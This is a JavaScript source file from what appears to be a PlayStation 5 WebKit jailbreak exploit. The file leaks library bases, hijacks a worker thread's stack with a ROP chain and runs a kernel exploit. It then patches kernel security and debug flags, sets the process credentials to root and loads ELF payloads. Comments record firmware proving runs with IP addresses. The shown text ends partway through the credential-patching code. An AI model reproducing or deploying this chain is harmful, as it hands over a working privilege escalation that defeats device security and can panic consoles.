if (!navigator.userAgent.includes('PlayStation 5')) {
    alert(`This is a PlayStation 5 Exploit. => ${navigator.userAgent}`);
    throw new Error("");
}

// to add a firmware: drop in offsets/<fw>.js and list it here
const supportedFirmwares = [
    "12.00", "12.02", "12.20", "12.40", "12.60", "12.70"
];
// parsed, not a fixed 4 chars: that returned "12.0" for firmware 12.02
const fw_match = /PlayStation 5\/(\d+\.\d+)/.exec(navigator.userAgent);
window.fw_str = fw_match ? fw_match[1] : "";
window.fw_float = parseFloat(window.fw_str);

if (!supportedFirmwares.includes(fw_str)) {

    alert(`Firmware ${fw_str} has no offsets file.\n\n`
        + `Add offsets/${fw_str}.js and list "${fw_str}" in supportedFirmwares `
        + `(main.js).\n\nPresent: ${supportedFirmwares.join(", ")}`);
    throw new Error("no offsets for fw " + fw_str);
}

let nogc = [];

function build_addr(p, buf, family, port, addr) {
    p.write1(buf.add32(0x00), 0x10);
    p.write1(buf.add32(0x01), family);
    p.write2(buf.add32(0x02), port);
    p.write4(buf.add32(0x04), addr);
}

function htons(port) {
    return ((port & 0xFF) << 8) | (port >>> 8);
}

function find_worker(p, libKernelBase) {
    const PTHREAD_NEXT_THREAD_OFFSET = 0x38;
    const PTHREAD_STACK_ADDR_OFFSET = 0xA8;
    const PTHREAD_STACK_SIZE_OFFSET = 0xB0;

    for (let thread = p.read8(libKernelBase.add32(OFFSET_lk__thread_list)); thread.low != 0x0 && thread.hi != 0x0; thread = p.read8(thread.add32(PTHREAD_NEXT_THREAD_OFFSET))) {
        let stack = p.read8(thread.add32(PTHREAD_STACK_ADDR_OFFSET));
        let stacksz = p.read8(thread.add32(PTHREAD_STACK_SIZE_OFFSET));
        if (stacksz.low == 0x80000) {
            return stack;
        }
    }
    throw new Error("failed to find worker.");
}

async function find_worker_return_slot(p, stack, libKernelBase) {
    const expected = libKernelBase.add32(OFFSET_lk_worker_wait_return);
    let lastCount = 0;

    // The worker may answer immediately before returning to its idle wait.
    // The exact saved PC is the firmware-specific fingerprint. Do not require
    // the following qword to resemble an RSP: that adjacent slot is ABI/frame
    // layout dependent and 10.60 legitimately does not satisfy that heuristic.
    for (let attempt = 0; attempt < 50; attempt++) {
        let hit = null;
        let count = 0;
        for (let offset = 0x7F000; offset < 0x80000; offset += 0x8) {
            const candidate = stack.add32(offset);
            const value = p.read8(candidate);
            if (value.low !== expected.low || value.hi !== expected.hi)
                continue;

            hit = candidate;
            count++;
        }
        if (count === 1) {
            jbmark("WORKER-RET-FINGERPRINT", "hit=0x" + hit.toString()
                + "-expected=0x" + expected.toString());
            return hit;
        }
        lastCount = count;
        await new Promise(resolve => setTimeout(resolve, 1));
    }
    throw new Error(`worker wait return fingerprint count ${lastCount}, expected 1`);
}

var LogLevel = {
    DEBUG: 0,
    INFO: 1,
    LOG: 2,
    WARN: 3,
    ERROR: 4,
    SUCCESS: 5,

    FLAG_TEMP: 0x1000
};

let consoleElem = null;
let lastLogIsTemp = false;

function log(string, level) {
    if (consoleElem === null) {
        consoleElem = document.getElementById("console");
    }

    const isTemp = level & LogLevel.FLAG_TEMP;
    level = level & ~LogLevel.FLAG_TEMP;
    const elemClass = ["LOG-DEBUG", "LOG-INFO", "LOG-LOG", "LOG-WARN", "LOG-ERROR", "LOG-SUCCESS"][level];

    if (isTemp && lastLogIsTemp) {
        const lastChild = consoleElem.lastChild;
        lastChild.innerText = string;
        lastChild.className = elemClass;
        return;
    } else if (isTemp) {
        lastLogIsTemp = true;
    } else {
        lastLogIsTemp = false;
    }

    let logElem = document.createElement("div");
    logElem.innerText = string;
    logElem.className = elemClass;
    consoleElem.appendChild(logElem);

    consoleElem.scrollTop = consoleElem.scrollHeight;
}

const AF_INET = 2;
const AF_INET6 = 28;
const SOCK_STREAM = 1;
const SOCK_DGRAM = 2;
const IPPROTO_UDP = 17;
const IPPROTO_IPV6 = 41;
const IPV6_PKTINFO = 46;

/* HARDPATH: firmwares with a hardware-proven full-chain run.
 *
 * Anything added to the SHARED path after a firmware's proving run is a change to code
 * that firmware never executed when it worked. For a proven firmware that is a
 * regression waiting to happen, and it has already cost us one: the 8s ROP-worker
 * timeout below was added for 7.00 bring-up (13c7abe, 2026-08-21) and silently applied
 * to 9.00-12.70, none of which had ever run with a bounded wait.
 *
 * Listed here = run the sequence the proving run ran. New instrumentation and new
 * safety nets are opt-in for these until they have their own hardware evidence.
 *
 * STANDING RULE (operator, 2026-08-28): the second a 12.XX hardware run is guaranteed,
 * hardpath it. Do not wait for a tidy moment. The cost of not doing it is already paid:
 * 12.40 delivered four end-to-end runs and was still carried here as a "constant-identical
 * twin" rather than as proven, and 12.20 sat in a credHoist=0 list until it panicked.
 * `tools/hardpath_record.py` scans every beacon log and prints anything proven but not
 * listed; `--check` exits non-zero so it can gate a publish.
 *
 * PROVEN = reached "=== p2jb complete ===" from its OWN jailbreak. ELFLDR-READY on an
 * already-jailbroken console does NOT count - that is a fresh renderer that never ran the
 * exploit, and scoring those as end-to-end has misled this project before.
 *
 * fw      proven                                              run          where / when
 * 7.00    full chain -> elfldr, devkit                        -            WORKING.txt 08-21
 * 9.05    full chain                                          -            WORKING.txt 08-17
 * 12.00   full chain, retail                                  r52islk      10.0.0.106  08-28
 * 12.00   full chain retail, FIRST RUN WITH credHoist=1        r7v97r6      10.0.0.106  08-28
 *         joinRet=0x0, menu 10 tiles, "=== p2jb complete ===". This is the one that
 *         matters: it proves the unconditional safety migration does NOT break 12.00,
 *         which was the open question behind gating it per-firmware in the first place.
 * 12.00   full chain retail, on the r9-corrected build v=153     r7ztug3      10.0.0.106  08-29
 *         joinRet=0x0, 10 tiles. Regression check for the 7.00 gadget/offsets change:
 *         editing the low-firmware offsets did not disturb 12.x.
 * 12.70   full chain devkit, on the r9-corrected build v=154     rmtdt3zxn    10.0.0.219  08-29
 *         joinRet=0x0, 11 tiles. Same regression check, other hw family.
 * 12.00   full chain, devkit                                  rmt6itydg    10.0.0.219  08-24
 * 12.40   full chain, menu 10 tiles                           rmsybl9w0    192.168.1.12  08-18
 * 12.40   full chain, menu 10 tiles                           rmt8dvs47    93.193.57.238 08-25
 * 12.40   full chain, menu 10 tiles                           rmtabw23o    217.234.97.69 08-26
 * 12.40   full chain                                          rmtbbrb4t    217.234.97.69 08-28
 * 12.60   full chain, menu 10 tiles                           rmsxuc894    192.168.1.12  08-18
 * 12.70   full chain -> elfldr, devkit                        rmsxdbmmw    WORKING.txt 08-17
 * 12.70   RETAIL full chain, menu in place, p2jb complete     rmtdlcdep    186.15.99.226 08-28
 * 12.70   DEVKIT full chain, menu in place, p2jb complete     rmtdltalc    10.0.0.219  08-28
 * 12.70   DEVKIT full chain, credHoist=1 build v=150           rmtdojo2f    10.0.0.219  08-28
 *         joinRet=0x0, 11 tiles. Pairs with r7v97r6: BOTH hw families re-proven on the
 *         unconditional-safety-net build, not just on the build that preceded it.
 *         Both families, same flags (credHoist=1 kexpSched=0), same day, same build.
 *
 * 12.02   no end-to-end run on record. Reaches the menu; carried as a twin of 12.00.
 * 12.20   NO end-to-end run on record anywhere in the logs - the only 12.20 run captured
 *         (rmsxt1m6c, 192.168.1.12, 08-18) was a deliberate preflight-only stop with
 *         skipleak=1. The operator reports 12.20 running on hardware; a run served from
 *         GitHub Pages has nowhere to send beacons, so it would be invisible here. It is
 *         hardpathed on the twin argument, NOT on evidence - if a 12.20 run ever reaches
 *         this host, record it and delete this paragraph.
 */
const HARDPATH_FW = {
    "7.00": 1, "9.05": 1,
    "12.00": 1, "12.02": 1, "12.20": 1, "12.40": 1, "12.60": 1, "12.70": 1,
};
function isHardpath() {
    try { return !!HARDPATH_FW[String(window.fw_str)]; } catch (e) { return false; }
}

// The rop_slave probe already had to go 4s -> 20s (93ea1b5) because this worker is
// genuinely slow on a cold run, so 8s was never a safe ceiling for it either.
const ROP_WAIT_MS = 20000;

/* PER-FIRMWARE PROFILES - the generalisation of HARDPATH.
 *
 * HARDPATH above answers one question ("is this firmware proven?") and gates ONE
 * behaviour, the rop-worker bound. Every other fix still landed in the SHARED path, so
 * fixing 12.70 rewrote what 12.00 executes and vice versa. That is how 2026-08-28 went:
 * three fixes for 12.70, and a 12.00 that had been delivering payloads stopped.
 *
 * This records, per firmware, WHICH behaviours its proving run actually executed.
 *
 *   - A new fix lands as a flag here, ON only for the firmware being fixed.
 *   - A flag is NEVER flipped for an already-proven firmware without a fresh proving run
 *     on that firmware's hardware. "It should be safe" is not evidence.
 *   - A firmware NOT listed gets FW_DEFAULT: everything on. Nothing is proven there, so
 *     there is nothing to regress and the safety nets are worth having.
 *   - Every run beacons FW-PROFILE, so the log says which path it took. Without that,
 *     a profile is just another silent difference between runs.
 *
 * Flags, and why each is gated rather than shared:
 *   credHoist  secureCredsOffA() before the kexp spawn. WRITES kernel state on the
 *              success path (fd f_cred, thread td_ucred, pins cred A), so it is not
 *              inert and must not be forced onto a proven firmware.
 *   kexpSched  drop to timeshare + widen affinity before scePthreadCreate. Changes the
 *              scheduling the kexp thread inherits - success path, so gated.
 *   staleGuard NOT listed deliberately: it only fires when ui_kqcnt is already in the
 *              millions, which cannot happen on a fresh boot, so it can never alter a
 *              run that was going to work. It stays unconditional.
 *
 * Proven configurations, with the evidence:
 *   12.70 RETAIL  run on 186.15.99.226, 2026-08-28 20:35: jailbroke, KEXP-JOIN
 *                 joinRet=0x0, menu 10 tiles in place, "=== p2jb complete ===",
 *                 full post-jb migrate + pin + pipe_buffer NULL. credHoist=1 kexpSched=0.
 *   12.70 DEVKIT  run on 10.0.0.219, 2026-08-28 20:37: same shape, 11 tiles (kstuff
 *                 hidden), joinRet=0x0, "=== p2jb complete ===". credHoist=1 kexpSched=0.
 *                 Retail and devkit proved the SAME flag set - one row serves both.
 *   12.00         pooP2JB @ 0ded878, operator-confirmed end-to-end before 2026-08-28.
 *
 * CORRECTION 2026-08-28, and the reason credHoist is gone from this table.
 * credHoist gated secureCredsOffA() - migrating fd f_cred and thread td_ucred off the
 * freed cred A before the kexp spawn. I set it 0 for 12.00-12.60 on the reasoning "not
 * in that firmware's proven configuration". That reasoning is valid for a BEHAVIOUR
 * change and invalid for a SAFETY NET, and this is a safety net: without the migration
 * a run that stalls at the join leaves every parked fd holding a freed cred, and the
 * next fdescfree() walk panics the kernel (Fatal trap 12). PIN-EARLY alone does NOT
 * cover it - it only sets cr_ref, and anything reallocating A's chunk later leaves
 * crfree decrementing a non-ucred. The operator reported a 12.20 kernel panic, and
 * 12.20 was in that list; 10.0.0.106 on 12.00 stalled at KEXP-JOIN-PRE in the same
 * unprotected state minutes later.
 * A safety net does not need per-firmware proof before it may run. It is idempotent
 * (12.70 logs "nothing to migrate - all already on B" on the second call), it is
 * independent of the kexp blob, and it costs a dead run nothing. It is unconditional
 * now, and it must stay unconditional. ?fw_credHoist=0 still exists for deliberate
 * single-console testing and is the only way to turn it off.
 */
/* credHoist is NOT in this table, deliberately - see the CORRECTION above.
 * kexpSched defaults OFF: it is an untested hypothesis, and both 2026-08-28 successes
 * ran with it off. An unlisted firmware gets the proven shape, not the experiment. */
const FW_DEFAULT = { credHoist: true, kexpSched: false };
const FW_PROFILE = {
    "12.00": { kexpSched: false },
    "12.02": { kexpSched: false },
    "12.20": { kexpSched: false },
    "12.40": { kexpSched: false },
    "12.60": { kexpSched: false },
    "12.70": { kexpSched: false },
};
function fwFlag(name) {
    // ?fw_kexpSched=1 / =0 overrides, for deliberately testing one flag on one console.
    try {
        const m = new RegExp("[?&]fw_" + name + "=([01])", "i").exec(location.search);
        if (m) return m[1] === "1";
    } catch (e) { }
    const p = FW_PROFILE[String(window.fw_str)];
    const v = p ? p[name] : undefined;
    return v === undefined ? !!FW_DEFAULT[name] : !!v;
}
window.fwFlag = fwFlag;
/* Emit it once syncMark EXISTS. main.js is loaded at p2jb.html:286 but syncMark is not
   defined until ~:933, so a plain `window.syncMark && ...` here silently emits nothing -
   which it did, 0 beacons, on the first build that shipped this. The flags themselves were
   fine (the gates read window.fwFlag from p2jb.js, which runs later); only the visibility
   was missing, and a profile you cannot see in the log is worth very little. */
(function emitFwProfile(tries) {
    try {
        if (window.syncMark) {
            const _fl = Object.keys(FW_DEFAULT)
                .map(function (k) { return k + "=" + (fwFlag(k) ? 1 : 0); }).join(" ");
            // Stamp the hw family too. 12.70 is proven on BOTH retail and devkit and they
            // share one row, so the log has to say which family a run actually was -
            // otherwise "12.70 works" is ambiguous across two different consoles.
            var _hw = "";
            try { _hw = localStorage.getItem("p2jb:hw") || "unset(retail-landing)"; } catch (e) { _hw = "unreadable"; }
            window.syncMark("FW-PROFILE", "fw=" + window.fw_str + " hw=" + _hw
                + (FW_PROFILE[String(window.fw_str)] ? " (listed/proven)" : " (unlisted - defaults)")
                + "  " + _fl);
            return;
        }
    } catch (e) { return; }
    if ((tries || 0) < 200) setTimeout(function () { emitFwProfile((tries || 0) + 1); }, 50);
})(0);

var __TRACE=(function(){try{return /(^|[?&])log=debug(&|$)/.test(location.search);}catch(e){return false;}})();
function __rop(t){if(!__TRACE)return;try{var x=new XMLHttpRequest();
    x.open("GET","log/ROP-"+encodeURIComponent(String(t)).slice(0,180),false);x.send();}catch(e){}}

function jbmark(tag, detail) {
    try {
        if (window.jb && typeof window.jb.mark === "function")
            window.jb.mark(tag, String(detail));
    } catch (e) {  }
}

async function prepare(p) {

    let textArea = document.createElement("textarea");

    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));

    let textAreaVtable = p.read8(textAreaVtPtr);

    // 9.00+ has no vtable rva; resolve from the host constructor instead.
    // A candidate is accepted only if it lands page-aligned in the user-module
    // band, so a wrong one is rejected rather than used.
    let libSceNKWebKitBase = null;
    if (window.fw_float >= 9.00
        && typeof OFFSET_wk_host_constructor_candidates !== "undefined"
        && OFFSET_wk_host_constructor_candidates.length
        && typeof globalThis.__ps5NativeCtor === "number") {
        const ctor = globalThis.__ps5NativeCtor;
        for (const hc of OFFSET_wk_host_constructor_candidates) {
            const wb = ctor - hc;
            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
                libSceNKWebKitBase = new int64(wb % 0x100000000, Math.floor(wb / 0x100000000));
                jbmark("WEBKIT-BASE-HC", "hc=0x" + hc.toString(16)
                    + "-base=0x" + wb.toString(16));
                break;
            }
        }
        if (libSceNKWebKitBase === null)
            throw new Error("no host-constructor candidate gave a valid base (ctor=0x"
                + ctor.toString(16) + ")");
    } else {
        jbmark("WEBKIT-BASE-VTABLE", "fw=" + window.fw_str
            + "-ctor=" + (typeof globalThis.__ps5NativeCtor === "number"
                ? "0x" + globalThis.__ps5NativeCtor.toString(16) : "absent")
            + "-hc=" + (typeof OFFSET_wk_host_constructor_candidates !== "undefined"
                ? OFFSET_wk_host_constructor_candidates.length : "none"));
        /* The vtable fallback is legacy for pre-9.00. On 9.00+ core.js always sets
           __ps5NativeCtor before prepare() runs, so this branch is unreachable in
           practice - it has fired 0 times in 81 recorded runs.

           It matters anyway. The constant is no longer 0 on 12.02 .. 12.70 - all six
           files now carry the vtable[0] derived from each firmware's libSceNKWebKit
           (12.x = 0x01DD0A90), by a method that reproduces the shipped value on every
           sub-9.00 file in both trees. This branch has still never run, so if the
           constant were ever wrong, or back to 0, subtracting it yields something that
           is not the module base. Every gadget and syscall is then derived from a wrong
           base and the page dies with no usable message. Refuse instead: a loud
           failure here is worth far more than a plausible wrong number. */
        if (!OFFSET_wk_vtable_first_element) {
            throw new Error("fw " + window.fw_str + " has no OFFSET_wk_vtable_first_element"
                + " and __ps5NativeCtor was absent - cannot resolve the WebKit base."
                + " (Reload; if this repeats the host-constructor path is broken.)");
        }
        libSceNKWebKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);
    }

    let libSceLibcInternalBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk_memset_import));
    libSceLibcInternalBase.sub32inplace(OFFSET_lc_memset);

    let libKernelBase = p.read8(libSceNKWebKitBase.add32(OFFSET_wk___stack_chk_guard_import));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_guard);

    // once per run, before any racer exists
    jbmark("MODULE-BASES", "wk=0x" + libSceNKWebKitBase.toString()
        + "-lk=0x" + libKernelBase.toString()
        + "-lc=0x" + libSceLibcInternalBase.toString());

    let gadgets = {};
    let syscalls = {};

    for (let gadget in wk_gadgetmap) {
        gadgets[gadget] = libSceNKWebKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let sysc in syscall_map) {
        syscalls[sysc] = libKernelBase.add32(syscall_map[sysc]);
    }

    let nogc = [];

    function malloc_dump(sz) {
        let backing;
        backing = new Uint8Array(sz);
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc(sz, type = 4) {
        let backing;
        if (type == 1) {
            backing = new Uint8Array(1000 + sz);
        } else if (type == 2) {
            backing = new Uint16Array(0x2000 + sz);
        } else if (type == 4) {
            backing = new Uint32Array(0x10000 + sz);
        }
        nogc.push(backing);

        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint8Array(1001);
        let og_array_i = p.leakval(og_array).add32(0x10);

        function setAddr(newAddr, size) {
            p.write8(og_array_i, newAddr);
            p.write4(og_array_i.add32(0x8), size);
            p.write4(og_array_i.add32(0xC), 0x1);
        }

        setAddr(addr, size);

        og_array.setAddr = setAddr;

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }

        let ptr = p.read8(p.leakval(bufView).add32(0x10));
        ptr.backing = bufView;
        return ptr;
    }

    function readstr(addr, maxlen = -1) {
        let str = "";
        for (let i = 0; ; i++) {
            if (maxlen != -1 && i >= maxlen) { break; }
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function writestr(addr, str) {
        let waddr = addr.add32(0);
        if (typeof (str) == "string") {

            for (let i = 0; i < str.length; i++) {
                let byte = str.charCodeAt(i);
                if (byte == 0) {
                    break;
                }
                p.write1(waddr, byte);
                waddr.add32inplace(0x1);
            }
        }
        p.write1(waddr, 0x0);
    }

    async function wait_for_worker() {

        return new Promise((resolve) => {
            worker.onmessage = function (e) {
                resolve(1);
            }
            worker.postMessage(0);
        });

    }

    let worker = new Worker("rop_slave.js");

    jbmark("PREP-PRE-WORKER-AWAIT", "next=await-wait_for_worker()-first-yield");
    await wait_for_worker();
    jbmark("PREP-POST-WORKER-AWAIT", "survived-the-first-yield");

    let worker_stack = find_worker(p, libKernelBase);
    jbmark("PREP-WORKER-STACK", "stack=0x" + worker_stack.toString()
        + "-next=malloc(0x40)+worker_rop(0xC0000)");
    let original_context = malloc(0x40);

    let return_address_ptr;
    if (typeof OFFSET_lk_worker_wait_return !== "undefined") {
        return_address_ptr = await find_worker_return_slot(p, worker_stack, libKernelBase);
    } else {
        // Backward-compatible path for original profiles without a saved-PC fingerprint.
        return_address_ptr = worker_stack.add32(OFFSET_WORKER_STACK_OFFSET);
    }
    let original_return_address = p.read8(return_address_ptr);
    let stack_pointer_ptr = return_address_ptr.add32(0x8);

    function pre_chain(chain) {

        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_setjmp));
    }

    async function launch_chain(chain) {

        let original_value_of_stack_pointer_ptr = p.read8(stack_pointer_ptr);
        chain.push_write8(original_context, original_return_address);
        chain.push_write8(original_context.add32(0x10), return_address_ptr);
        chain.push_write8(stack_pointer_ptr, original_value_of_stack_pointer_ptr);
        chain.push(gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_lc_longjmp));

        if (window.jb && window.jb.hot)
            jbmark("PREP-WILL-WRITE-RETADDR", "retptr=0x" + return_address_ptr.toString()
                + "-poprsp=0x" + gadgets["pop rsp"].toString()
                + "-rsp=0x" + chain.stack_entry_point.toString());

        p.write8(return_address_ptr, gadgets["pop rsp"]);
        p.write8(stack_pointer_ptr, chain.stack_entry_point);
        // read the two slots back: proves the arbitrary write reached the worker stack


        if (window.jb && window.jb.hot)
            jbmark("CHAIN-PRE-POST", "next=worker.postMessage(0)-rop-executes-now");
        const hardpath = isHardpath();
        let p1 = await new Promise((resolve) => {
            let settled = false;
            worker.onmessage = function (e) {
                if (settled) return;
                settled = true;
                resolve(1);
            }
            /* A hang and a fault look identical without a bound - but a bound is only
             * worth having if timing out is treated as failure. It was not: the timeout
             * resolved -1 and the only guard below is `p1 == 0`, so a slow worker sailed
             * through and the run continued issuing syscalls down a chain whose worker
             * had never answered. That is the wedge that cost 12.70 its first run.
             *
             * On a HARDPATH firmware there is no bound at all: wait on onmessage exactly
             * as the proving run did. Everywhere else the bound is 20s and it THROWS.
             *
             * Safe to throw here: prepare() is pure userland. No kernel structure has
             * been touched yet - the pipe pair is not poisoned until stage2
             * (p2jb.js: kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24)), so at
             * this point master.pipe_buffer.buffer is still its own pipe_map allocation
             * and FreeBSD's pipeclose() -> pipe_free_kmem() unmaps exactly what it
             * allocated. Aborting here cannot panic; continuing on a phantom -1 can,
             * because it lets the sync executor fire syscalls while the hijacked worker
             * stack is in an unknown state. */
            if (!hardpath) {
                setTimeout(function () {
                    if (settled) return;
                    settled = true;
                    __rop("ROP-TIMEOUT-worker-never-answered-" + ROP_WAIT_MS + "ms");
                    resolve(-1);
                }, ROP_WAIT_MS);
            }
            worker.postMessage(0);
        });
        if (window.jb && window.jb.hot)
            jbmark("CHAIN-POST-POST", "worker-answered-p1=" + p1);
        if (p1 == 0) {
            throw new Error("The rop thread ran away. ");
        }
    }

    let p2 = {
        write8: p.write8,
        write4: p.write4,
        write2: p.write2,
        write1: p.write1,
        read8: p.read8,
        read4: p.read4,
        read2: p.read2,
        read1: p.read1,
        leakval: p.leakval,
        pre_chain: pre_chain,
        launch_chain: launch_chain,
        malloc_dump: malloc_dump,
        malloc: malloc,
        stringify: stringify,
        array_from_address: array_from_address,
        readstr: readstr,
        writestr: writestr,
        libSceNKWebKitBase: libSceNKWebKitBase,
        libSceLibcInternalBase: libSceLibcInternalBase,
        libKernelBase: libKernelBase,
        nogc: nogc,
        syscalls: syscalls,
        gadgets: gadgets
    };

    let chain = new worker_rop(p2);

    const JB_POISON = new int64(0xDEADBEEF, 0x00C0FFEE);
    p.write8(chain.return_value, JB_POISON);
    jbmark("PREP-GETPID-PRE", "retval=0x" + chain.return_value.toString()
        + "-poisoned-next=chain.syscall(SYS_GETPID)");

    let pid = await chain.syscall(SYS_GETPID);
    __rop("getpid raw=0x" + pid.toString());

    jbmark("PREP-GETPID-POST", "raw=0x" + pid.toString());
    if (pid.low == JB_POISON.low && pid.hi == JB_POISON.hi) {
        jbmark("PREP-CHAIN-DIDNT-RUN", "return-slot-still-poisoned");
        throw new Error("The ROP chain never executed: the return slot still "
            + "holds the poison. The hijacked thread is not the one postMessage "
            + "wakes (main.js:69's worker vs this one), or the stack write did "
            + "not land.");
    }

    if (pid.low == 0) {
        throw new Error("Webkit exploit failed.");
    }
    jbmark("PREP-GETPID-OK", "pid=" + pid.low);

    // ---- P2JB handoff: publish the primitive bundle the Y2JB adapter consumes ----
    // p2 carries read/write 1..8, malloc, gadgets{}, syscalls{}, libc bases,
    // array_from_address, writestr/readstr, leakval. chain is the async worker_rop.
    try {
        window.POOPS = {
            p: p2,
            chain: chain,
            int64: int64,
            toI64: function (x) {
                if (x && typeof x.low !== "undefined") return x;
                var b = (typeof x === "bigint") ? x : BigInt(x >>> 0);
                return new int64(Number(b & 0xffffffffn), Number((b >> 32n) & 0xffffffffn));
            },
            log: (typeof log === "function") ? function (m) { log(m); } : function () { },
            jbmark: (typeof jbmark === "function") ? jbmark : function () { },
            fw_str: window.fw_str,
            // poops's already-hijacked rop_slave.js worker + its 0x80000 stack. After the
            // p2jb handoff poops's engine is skipped, so this worker is idle/parked and
            // rop-worker reuses it (same wake mechanism) instead of spawning a colliding one.
            worker: worker,
            worker_stack: worker_stack
        };
        jbmark("P2JB-POOPS-PUBLISHED", "gadgets=" + Object.keys(p2.gadgets || {}).length);
    } catch (e) { }

    return { p: p2, chain: chain };
}

async function main(userlandRW, wkOnly = false) {
    const debug = false;

    const { p, chain } = await prepare(userlandRW);
    if (debug) await log("Chain initialized", LogLevel.DEBUG);

    async function get_local_ips() {

        const SYSCALL_NETGETIFLIST = 0x07D;
        let ifaddr_count_buf = p.malloc(0x4);

        await chain.add_syscall_ret(ifaddr_count_buf, SYSCALL_NETGETIFLIST, 0, 10);
        await chain.run();

        let ifaddr_count = p.read4(ifaddr_count_buf);

        let if_addr_obj_size = 0x3C0;
        let if_addresses_length = if_addr_obj_size * ifaddr_count;
        let if_addresses = p.malloc(if_addresses_length);
        let ifaddrlist_ptr = if_addresses.add32(0x0);

        await chain.add_syscall(SYSCALL_NETGETIFLIST, ifaddrlist_ptr, ifaddr_count);
        await chain.run();

        let iplist = [];
        for (let i = 0; i < ifaddr_count; i++) {
            let adapterName = "";

            for (let i2 = 0; i2 < 16; i2++) {

                let char = p.read1(if_addresses.add32(if_addr_obj_size * i + i2));
                if (char == 0) {
                    break;
                }
                adapterName += String.fromCharCode(char);
            }

            let ipAddress = "";

            for (let i2 = 40; i2 < 44; i2++) {
                ipAddress += p.read1(if_addresses.add32(if_addr_obj_size * i + i2)).toString(10) + ".";
            }
            ipAddress = ipAddress.slice(0, -1);

            iplist.push({ name: adapterName, ip: ipAddress });
        }

        return iplist;
    }

    let ip_list = await get_local_ips();
    let ip = ip_list.find(obj => obj.ip != "0.0.0.0");
    if (typeof ip === "undefined" || !ip.ip) {
        ip = { ip: "", name: "Offline" };
    }

    async function probe_sb_elfldr() {

        let fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
        if (fd <= 0) {
            return false;
        }

        let addr = p.malloc(0x10);
        build_addr(p, addr, AF_INET, htons(9021), 0x0100007F);
        let bind_res = (await chain.syscall(SYS_BIND, fd, addr, 0x10)).low << 0;
        await chain.syscall(SYS_CLOSE, fd);
        if (bind_res < 0) {
            return true;
        }

        return false;
    }

    let is_elfldr_running = await probe_sb_elfldr();
    await log("is elfldr running: " + is_elfldr_running, LogLevel.INFO);
    if (wkOnly && !is_elfldr_running) {
        let res = confirm("elfldr doesnt seem to be running and in webkit only mode it wont be loaded, continue?");
        if (!res) {
            throw new Error("Aborted");
        }
    }

    if (!wkOnly && is_elfldr_running) {
        let res = confirm("elfldr seems to be running, would you like to skip the kernel exploit, and switch to sender-only mode?");
        if (res) {
            wkOnly = true;
        }
    }

    populatePayloadsPage(wkOnly);

    var load_payload_into_elf_store_from_local_file = async function (filename) {
        await log("Loading ELF file: " + filename + " ...", LogLevel.LOG);
        const response = await fetch('payloads/' + filename);
        if (!response.ok) {
            throw new Error(`Failed to fetch the binary file. Status: ${response.status}`);
        }

        const data = await response.arrayBuffer();

        let byteArray;
        if (elf_store.backing.BYTES_PER_ELEMENT == 1) {
            byteArray = new Uint8Array(data);
        } else if (elf_store.backing.BYTES_PER_ELEMENT == 2) {
            byteArray = new Uint16Array(data);
        } else if (elf_store.backing.BYTES_PER_ELEMENT == 4) {
            byteArray = new Uint32Array(data);
        } else {
            throw new Error(`Unsupported backing array type. BYTES_PER_ELEMENT: ${elf_store.backing.BYTES_PER_ELEMENT}`);
        }

        elf_store.backing.set(byteArray);
        return byteArray.byteLength;
    }

    let SIZE_ELF_HEADER = 0x40;
    let SIZE_ELF_PROGRAM_HEADER = 0x38;
    var elf_store_size = SIZE_ELF_HEADER + (SIZE_ELF_PROGRAM_HEADER * 0x10) + 0x1000000;
    var elf_store = p.malloc(elf_store_size, 1);

    if (!wkOnly) {
        var krw = await runUmtx2Exploit(p, chain, log);

        function get_kaddr(offset) {
            return krw.ktextBase.add32(offset);
        }

        let security_flags = await krw.read4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS));
        await krw.write4(get_kaddr(OFFSET_KERNEL_SECURITY_FLAGS), security_flags | 0x14);

        await krw.write1(get_kaddr(OFFSET_KERNEL_TARGETID), 0x82);

        let qaf_dword = await krw.read4(get_kaddr(OFFSET_KERNEL_QA_FLAGS));
        await krw.write4(get_kaddr(OFFSET_KERNEL_QA_FLAGS), qaf_dword | 0x10300);

        let utoken_flags = await krw.read1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS));
        await krw.write1(get_kaddr(OFFSET_KERNEL_UTOKEN_FLAGS), utoken_flags | 0x1);
        await log("Enabled debug menu", LogLevel.INFO);

        let cur_uid = await chain.syscall(SYS_GETUID);
        await log("Escalating creds... (current uid=0x" + cur_uid + ")", LogLevel.INFO);

        await krw.write4(krw.procUcredAddr.add32(0x04), 0);
        await krw.write4(krw.procUcredAddr.add32(0x08), 0);
        await krw.write4(krw.procUcredAddr.add32(0x0C), 0);
        await krw.write4(krw.procUcredAddr.add32(0x10), 1);
        await krw.write4(krw.procUcredAddr.add32(0x14), 0);

        await krw.write8(krw.procUcredAddr.add32(0x58), new int64(0x00000013, 0x48010000));
        await krw.write8(krw.procUcredAddr.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF));
        await krw.write8(krw.procUcredAddr.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));
        await krw.write1(krw.procUcredAddr.add32(0x83), 0x80);

        let proc_pdynlib_offset = krw.curprocAddr.add32(0x3E8);
        let proc_pdynlib_addr = await krw.read8(proc_pdynlib_offset);

        let restrict_flags_addr = proc_pdynlib_addr.add32(0x118);
